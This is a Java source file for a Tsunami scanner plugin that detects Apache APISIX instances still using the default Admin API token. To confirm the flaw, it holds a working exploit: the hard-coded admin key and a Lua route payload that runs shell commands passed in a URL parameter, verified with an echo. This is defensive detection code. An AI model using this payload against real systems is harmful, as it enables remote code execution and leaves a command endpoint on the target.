/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.apache_default_token;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;
import static java.nio.charset.StandardCharsets.UTF_8;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.net.MediaType;
import com.google.inject.Inject;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.net.URLEncoder;
import java.time.Clock;
import java.time.Instant;

/** A {@link VulnDetector} that detects Apache APISIX Default Admin Token. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Apache APISIX with default Admin token Detector",
    version = "0.1",
    description = "This detector checks Apache APISIX with default Admin token.",
    author = "hh-hunter",
    bootstrapModule = ApacheDefaultTokenDetectorBootstrapModule.class)
public final class ApacheDefaultTokenDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  @VisibleForTesting static final String DETECTION_STRING = "tsunami_verify_success";

  @VisibleForTesting
  static final String VULN_DESCRIPTION =
      "APISIX provides REST management API functionality. Users can manage APISIX using the REST Admin API. If the "
          + "REST Admin API is exposed externally and the default hard-coded admin_key is not modified, an attacker"
          + " can use the admin_key to execute arbitrary Lua code, leading to remote command execution.";

  private static final String VUL_PATH = "apisix/admin/routes";
  private static final String POST_DATA =
      "{\"uri\":\"/%s\",\"script\":\"local _M = {} \\n function _M.access(conf, ctx) \\n local os = require('os')\\n "
          + "local args = assert(ngx.req.get_uri_args()) \\n local f =        assert(io.popen(args.cmd, 'r'))\\n "
          + "local s = assert(f:read('*a'))\\n ngx.say(s)\\n f:close()  \\n end \\nreturn _M\",\"upstream\":{\"type"
          + "\":\"roundrobin\",\"nodes\":{\"example.com:80\":1}}}";
  private static final String TOKEN_HEADER_NAME = "X-API-KEY";
  private static final String TOKEN_VALUE = "edd1c9f034335f136f87ad84b625c8f1";
  private static final String EXECUTE_DATA = String.format("echo %s", DETECTION_STRING);

  private final HttpClient httpClient;

  private final Clock utcClock;

  @Inject
  ApacheDefaultTokenDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Apache APISIX Default Admin Token starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetBaseUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    String targetVulnerabilityUrl = targetBaseUrl + VUL_PATH;
    String randomVerifyPath = String.format("tsunami_%s", Instant.now(utcClock).toEpochMilli());
    String targetExecuteUrl =
        targetBaseUrl + randomVerifyPath + "?cmd=" + URLEncoder.encode(EXECUTE_DATA, UTF_8);

    try {
      HttpResponse checkIsAPISIXResponse =
          httpClient.sendAsIs(
              get(targetExecuteUrl).setHeaders(HttpHeaders.builder().build()).build());
      if (!checkIsAPISIXResponse.headers().get("Server").orElse("").contains("APISIX")) {
        logger.atInfo().log("Target %s is not an Apache APISIX instance.", targetBaseUrl);
        return false;
      }

      HttpResponse httpResponse =
          httpClient.sendAsIs(
              post(targetVulnerabilityUrl)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader(CONTENT_TYPE, MediaType.JSON_UTF_8.toString())
                          .addHeader(TOKEN_HEADER_NAME, TOKEN_VALUE)
                          .build())
                  .setRequestBody(
                      ByteString.copyFromUtf8(String.format(POST_DATA, randomVerifyPath)))
                  .build());
      if (httpResponse.status().code() == 201) {
        logger.atInfo().log("Request payload to target %s succeeded", targetBaseUrl);
        HttpResponse executeResponse =
            httpClient.sendAsIs(
                get(targetExecuteUrl).setHeaders(HttpHeaders.builder().build()).build());
        if (executeResponse.status().code() == 200
            && executeResponse.bodyString().orElse("").contains(DETECTION_STRING)) {
          logger.atInfo().log("Vulnerability detected on target %s", targetBaseUrl);
          return true;
        }
      } else {
        logger.atInfo().log("Execution of the command to the target %s has failed.", targetBaseUrl);
      }
    } catch (IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", targetBaseUrl);
      return false;
    }
    return false;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("APISIX_DEFAULT_TOKEN"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Apache APISIX's Admin API Default Access Token (RCE)")
                .setRecommendation(
                    "Change the default admin API key and set appropriate IP access control lists.")
                .setDescription(VULN_DESCRIPTION))
        .build();
  }
}
